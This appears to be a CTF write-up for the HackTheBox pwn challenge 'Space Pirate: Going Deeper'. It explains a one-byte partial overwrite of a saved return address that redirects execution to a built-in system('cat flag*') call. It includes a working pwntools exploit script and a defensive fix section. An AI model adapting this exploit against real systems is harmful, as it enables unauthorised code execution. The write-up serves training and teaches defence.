---
title: "Space Pirate: Going Deeper"
date: 2026-12-14 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, buffer-overflow, partial-overwrite, ret2win, pwntools]
description: "A Very Easy pwn challenge that teaches the one-byte overflow: a read just one byte too long lets you overwrite a single byte of the saved return address, and on a No-PIE binary that one byte is enough to bend ret onto an inline system(\"cat flag*\") the program would never reach on its own."
---

## Overview

`Space Pirate: Going Deeper` is a Very Easy HackTheBox **Pwn** challenge (originally CA CTF 2022's "Buffer Overflow 101"). The whole solve is a single, surgical [out-of-bounds write](https://cwe.mitre.org/data/definitions/787.html): a `read()` takes exactly **one byte more** than the buffer holds, so you control only the low byte of the saved return address. Because the binary has **no PIE**, that one byte is enough to redirect `ret` onto an inline win path that runs `system("cat flag*")` — without ever satisfying the two checks the program advertises.

## The technique

`checksec` sets the stage:

```
Arch:  amd64   RELRO: Full   Stack: No canary   NX: enabled   PIE: No PIE (0x400000)   glibc 2.27
```

The interesting function reads into a 40-byte buffer but asks for 57 (`0x39`) bytes, then gates a flag-printing `system()` call behind two conditions:

```c
char buf[40];                       // at rbp-0x30
read(0, buf, 0x39);                 // 57 bytes -> one byte too many
if (a == 0xdeadbeef && b == 0x1337c0de && c == 0x1337beef   // a,b,c at rbp-0x38/-0x40/-0x48
    && strncmp(buf, "DRAEGER15th...", 0x34) != 0)
    system("cat flag*");            // the win, inline at 0x400b12
```

Both advertised conditions are **traps**:

1. **The magic-value checks are unsatisfiable.** `a`, `b`, `c` live at *lower* stack addresses than `buf`. A `read` fills memory forward (upward), so it can never write down into those variables. You cannot make them `0xdeadbeef`/`0x1337c0de`/`0x1337beef` — so don't try.
2. **The password is bait.** The check is `strncmp(...) != 0`, so *matching* the `"DRAEGER15th..."` string takes the **failure** branch. The "obvious" goal is the wrong one.

The real bug is the off-by-much read. Counting forward from the 40-byte buffer:

| bytes | what |
|------:|------|
| 0–39 | `buf` (40) |
| 40–47 | menu-choice local |
| 48–55 | saved RBP |
| **56** | **low byte of saved RIP** |

Byte 57 lands on the low byte of the saved return address — exactly one byte of control.

## Solution

The saved return address normally points back into `main` at `0x400b94`. The win instruction `lea rdi,"cat flag*"; call system` sits at `0x400b12` — the **same page**, so only the low byte changes (`0x94 -> 0x12`). When the function runs `leave; ret` (it does, even down the failure branch), it returns straight to `0x400b12` and the server runs `cat flag*` for us.

```
payload = b'A' * 56 + b'\x12'   # 56 filler + low byte of saved RIP
```

There is one gotcha that is easy to lose an hour to: the vulnerable `read()` is called **once** (no loop). Locally with pwntools `process()` all 57 bytes arrive in a single shot, so the exploit works. Over **TCP** the bytes can split across segments — `read()` returns short, the critical 57th byte never lands, and the function simply returns to `main` and exits cleanly. No crash, no flag, no hint. The fix is to make sure the whole payload is buffered before that single `read()` fires:

Create `solve.py`:

```python
#!/usr/bin/env python3
import sys, re
from pwn import *
context.arch = 'amd64'

HOST, PORT = sys.argv[1], int(sys.argv[2])
io = remote(HOST, PORT)

io.sendlineafter(b'Exit', b'1')      # menu -> reach the vulnerable read
io.recvrepeat(0.5)                   # CRITICAL: buffer everything before the single read()
io.send(b'A' * 56 + b'\x12')         # 1-byte overwrite: saved RIP 0x400b94 -> 0x400b12

data = io.recvall(timeout=6)         # system("cat flag*") prints the flag server-side
print(data.decode(errors='replace'))
m = re.search(rb'HTB\{[^}]*\}', data)
if m: log.success('FLAG: ' + m.group(0).decode())
io.close()
```

Run it against the instance and the flag prints on the first attempt:

```bash
python3 solve.py <target-ip> <target-port>
# [+] FLAG: HTB{...}
```

## Why it worked

The program's safety relied on conditions that its own write primitive could never reach: the magic variables sit below the buffer, and the password check is inverted into a decoy. But it left a fully-formed `system("cat flag*")` compiled into the binary, on the same 256-byte page as the function's normal return target. With **no PIE** that address is fixed, so corrupting a single byte of the saved return address is enough to land on it — a minimal [buffer overflow](https://cwe.mitre.org/data/definitions/120.html) turned into a "return to win" with one byte of control.

## Fix / defense

- Use a **bounded** read (`read(0, buf, sizeof(buf))`) — never request more bytes than the destination holds.
- Compile with stack canaries and ASLR/PIE so a single saved-return-address byte cannot be aimed at a known target.
- Don't ship a reachable `system()`/win gadget in a release binary, and don't rely on "impossible" gates for safety — make the dangerous path simply not exist.
